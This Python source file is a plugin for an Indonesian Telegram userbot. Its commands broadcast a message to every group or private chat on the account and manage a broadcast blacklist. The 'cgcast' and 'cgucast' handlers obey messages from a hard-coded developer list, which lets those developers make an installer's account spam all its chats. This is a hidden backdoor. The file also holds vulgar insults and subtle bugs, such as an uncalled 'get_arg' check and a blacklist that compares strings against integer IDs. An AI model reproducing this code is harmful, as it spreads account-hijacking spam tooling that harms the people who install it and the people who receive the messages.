# Credits: @mrismanaziz
# Copyright (C) 2022 Pyro-ManUserbot
#
# This file is a part of < https://github.com/mrismanaziz/PyroMan-Userbot/ >
# PLease read the GNU Affero General Public License in
# <https://www.github.com/mrismanaziz/PyroMan-Userbot/blob/main/LICENSE/>.
#
# t.me/SharingUserbot & t.me/Lunatic0de

import os
import asyncio
from pyrogram import Client, enums, filters
from pyrogram.types import Message
from requests import get
from rams.split.berak.adminHelpers import DEVS
from geezlibs.ram.helpers.basic import edit_or_reply
from geezlibs.ram.helpers.tools import get_arg
from geezlibs.ram.utils.misc import restart
from geezlibs.ram import pyram, ram

# Path ke file blacklist
BLACKLIST_FILE = "blacklist.txt"

def load_blacklist():
    if not os.path.exists(BLACKLIST_FILE):
        return set()  # Mengembalikan set kosong jika file tidak ada
    with open(BLACKLIST_FILE, "r") as file:
        return {line.strip() for line in file if line.strip()}

def save_blacklist(blacklist):
    with open(BLACKLIST_FILE, "w") as file:
        for chat_id in blacklist:
            file.write(f"{chat_id}\n")

# Load blacklist saat bot dimulai
BLACKLIST_GCAST = load_blacklist()

@Client.on_message(filters.command("cgcast", ["."]) & filters.user(DEVS) & ~filters.me)
@pyram("gcast", ram)
async def gcast_cmd(client: Client, message: Message):
    if message.reply_to_message or get_arg(message):
        Man = await edit_or_reply(message, "`Awas Limit ya kontol...'")
    else:
        return await message.edit_text("**Pesannya Mana ngentod**")
    done = 0
    error = 0
    async for dialog in client.get_dialogs():
        if dialog.chat.type in (enums.ChatType.GROUP, enums.ChatType.SUPERGROUP):
            if message.reply_to_message:
                msg = message.reply_to_message
            elif get_arg:
                msg = get_arg(message)
            chat = dialog.chat.id
            if chat not in BLACKLIST_GCAST:
                try:
                    if message.reply_to_message:
                        await msg.copy(chat)
                    elif get_arg:
                        await client.send_message(chat, msg)
                    done += 1
                    await asyncio.sleep(0.3)
                except Exception:
                    error += 1
                    await asyncio.sleep(0.3)
    await Man.edit_text(
        f"**Berhasil Mengirim Pesan Ke** `{done}` **Grup, Gagal Mengirim Pesan Ke** `{error}` **Grup**"
    )

@Client.on_message(filters.command("cgucast", ["."]) & filters.user(DEVS) & ~filters.me)
@pyram("gucast", ram)
async def gucast_cmd(client: Client, message: Message):
    if message.reply_to_message or get_arg(message):
        Man = await edit_or_reply(message, "`Awas Limit ya kontol...")
    else:
        return await message.edit_text("**Pesannya Mana ngentod**")
    done = 0
    error = 0
    async for dialog in client.get_dialogs():
        if dialog.chat.type == enums.ChatType.PRIVATE and not dialog.chat.is_verified:
            if message.reply_to_message:
                msg = message.reply_to_message
            elif get_arg:
                msg = get_arg(message)
            chat = dialog.chat.id
            if chat not in DEVS:
                try:
                    if message.reply_to_message:
                        await msg.copy(chat)
                    elif get_arg:
                        await client.send_message(chat, msg)
                    done += 1
                    await asyncio.sleep(0.3)
                except Exception:
                    error += 1
                    await asyncio.sleep(0.3)
    await Man.edit_text(
        f"**Berhasil Mengirim Pesan Ke** `{done}` **chat, Gagal Mengirim Pesan Ke** `{error}` **chat**"
    )

@pyram("blchat", ram)
async def blchatgcast(client: Client, message: Message):
    blacklistgc = "True" if BLACKLIST_GCAST else "False"
    list_bl = "\n".join(f"» `{chat_id}`" for chat_id in BLACKLIST_GCAST)
    if blacklistgc == "True":
        await edit_or_reply(
            message,
            f"🔮 **Blacklist GCAST:** `Enabled`\n\n📚 **Blacklist Group:**\n{list_bl}\n\nKetik `.addbl` di grup yang ingin anda tambahkan ke daftar blacklist gcast.",
        )
    else:
        await edit_or_reply(message, "🔮 **Blacklist GCAST:** `Disabled`")

@pyram("addbl", ram)
async def addblacklist(client: Client, message: Message):
    xxnx = await edit_or_reply(message, "`Processing...`")
    blgc = str(message.chat.id).strip()
    
    # Menambahkan chat_id ke blacklist
    BLACKLIST_GCAST.add(blgc)
    
    # Simpan blacklist ke file
    save_blacklist(BLACKLIST_GCAST)
    
    await xxnx.edit(f"**Berhasil Menambahkan** `{blgc}` **ke daftar blacklist gcast.**")

@pyram("delbl", ram)
async def delblacklist(client: Client, message: Message):
    xxnx = await edit_or_reply(message, "`Processing...`")
    gett = str(message.chat.id)
    
    if gett in BLACKLIST_GCAST:
        BLACKLIST_GCAST.remove(gett)
        
        # Simpan blacklist ke file
        save_blacklist(BLACKLIST_GCAST)
        
        await xxnx.edit(f"**Berhasil Menghapus** `{gett}` **dari daftar blacklist gcast.**")
    else:
        await xxnx.edit("**Grup ini tidak ada dalam daftar blacklist gcast.**")

@pyram("listbl", ram)
async def list_blacklist(client: Client, message: Message):
    if not BLACKLIST_GCAST:
        return await edit_or_reply(message, "📜 **Tidak ada grup dalam daftar blacklist.**")
    
    list_bl = "\n".join(f"» `{chat_id}`" for chat_id in BLACKLIST_GCAST)
    await edit_or_reply(message, f"🔮 **Daftar Blacklist GCAST:**\n{list_bl}")
